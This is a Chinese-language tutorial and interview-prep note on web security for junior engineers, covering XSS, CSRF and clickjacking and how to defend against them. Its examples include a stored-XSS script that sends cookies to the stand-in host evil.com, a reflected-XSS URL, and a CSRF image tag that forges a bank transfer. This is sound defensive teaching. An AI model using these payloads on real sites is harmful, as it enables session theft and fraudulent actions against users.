---
title: "Web 安全入门：XSS/CSRF [P4-P5]"
level: "junior"
tags: ["XSS", "CSRF", "安全", "注入攻击"]
difficulty: "medium"
updated: "2026-09-10"
target: "P4-P5 初级工程师"
---

# Web 安全入门：XSS/CSRF [P4-P5]

> Web 安全是前端必须掌握的基础知识。XSS 和 CSRF 是最常见的两种攻击方式，理解它们才能有效防范。

## 核心概念（What）

### Web 安全威胁概览

```
前端常见安全威胁：
├── XSS（跨站脚本攻击）→ 注入恶意脚本
├── CSRF（跨站请求伪造）→ 冒充用户操作
├── 点击劫持 → 诱导用户点击
└── 敏感数据泄露 → 信息暴露
```

## 基础用法（How）

### XSS（Cross-Site Scripting）

```
XSS = 攻击者向页面注入恶意脚本

三种类型：

1. 存储型 XSS（最危险）
   恶意脚本存储在服务端
   → 所有访问者都会执行

   场景：评论区
   <script>document.location='http://evil.com/?c='+document.cookie</script>

2. 反射型 XSS
   恶意脚本在 URL 中
   → 用户点击链接时触发

   场景：搜索关键词
   https://example.com/search?q=<script>alert(1)</script>

3. DOM 型 XSS
   前端 JS 直接将不可信数据写入 DOM

   场景：
   const html = location.hash.slice(1); // 用户输入
   document.body.innerHTML = html;       // 直接插入！
```

### XSS 防范

```javascript
// 1. 使用框架的自动转义（Vue/React 默认转义）
// Vue
<p>{{ userInput }}</p>  // 自动转义 HTML

// React
<div>{userInput}</div>  // 自动转义

// 2. 避免使用危险 API
// ❌ 危险
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);

// ✅ 安全
element.textContent = userInput;
element.innerText = userInput;

// 3. 使用 DOMPurify 消毒
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 4. CSP（Content Security Policy）
// <meta http-equiv="Content-Security-Policy" content="script-src 'self'">

// 5. HttpOnly Cookie（JS 无法读取）
// Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
```

### CSRF（Cross-Site Request Forgery）

```
CSRF = 攻击者诱导用户在已登录的网站执行操作

攻击流程：
1. 用户登录 bank.com（Cookie 保存了 session）
2. 用户访问恶意网站 evil.com
3. evil.com 自动发起请求：
   <img src="https://bank.com/transfer?to=hacker&amount=1000">
4. 浏览器自动携带 bank.com 的 Cookie
5. 银行以为用户本人操作，执行转账
```

### CSRF 防范

```
1. CSRF Token（最常用）
   服务端生成随机 Token
   → 表单中携带
   → 服务端验证

   <form method="POST">
     <input type="hidden" name="_csrf" value="随机Token">
   </form>

2. SameSite Cookie
   Set-Cookie: session=abc; SameSite=Strict
   → Strict：完全禁止第三方携带
   → Lax：GET 请求允许（默认值）
   → None：允许（需配合 Secure）

3. 验证 Referer/Origin
   检查请求来源是否合法

4. 双重 Cookie
   将 Token 存在 Cookie 和请求体中
   → 跨站无法同时获取
```

### 点击劫持

```
点击劫持 = 用透明 iframe 覆盖页面，诱导用户点击

防范：
// 1. X-Frame-Options 响应头
X-Frame-Options: DENY        // 禁止 iframe
X-Frame-Options: SAMEORIGIN  // 只允许同源

// 2. CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none'

// 3. 前端检测（不推荐，可被绕过）
if (window !== top) {
  top.location = window.location;
}
```

## 常见面试题

### Q1: XSS 有哪些类型？如何防范？

```
类型：
├── 存储型 → 恶意脚本存服务端（最危险）
├── 反射型 → 恶意脚本在 URL 中
└── DOM 型 → 前端 JS 写入不可信数据

防范：
├── 自动转义（Vue/React 模板）
├── 避免 innerHTML/document.write
├── 使用 DOMPurify 消毒
├── CSP 限制脚本来源
└── HttpOnly Cookie
```

### Q2: CSRF 的原理是什么？如何防范？

```
原理：
├── 利用浏览器自动携带 Cookie 的机制
├── 诱导用户在已登录状态发起请求
└── 服务端以为是用户本人操作

防范：
├── CSRF Token（最常用）
├── SameSite Cookie
├── 验证 Referer/Origin
└── 双重 Cookie
```

### Q3: XSS 和 CSRF 的区别？

```
┌──────────┬──────────────────┬──────────────────┐
│          │      XSS         │      CSRF        │
├──────────┼──────────────────┼──────────────────┤
│ 攻击目标 │ 用户             │ 网站功能         │
│ 攻击方式 │ 注入恶意脚本     │ 伪造用户请求     │
│ Cookie   │ 窃取 Cookie      │ 利用 Cookie      │
│ 防范核心 │ 转义输入         │ 验证请求来源     │
└──────────┴──────────────────┴──────────────────┘
```

## 延伸练习

1. 在本地测试 XSS 注入（alert(1)）
2. 用 DOMPurify 过滤恶意 HTML
3. 了解 CSP 配置
4. 测试 SameSite Cookie 效果

## 参考资料

- [MDN Web 安全](https://developer.mozilla.org/zh-CN/docs/Web/Security)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
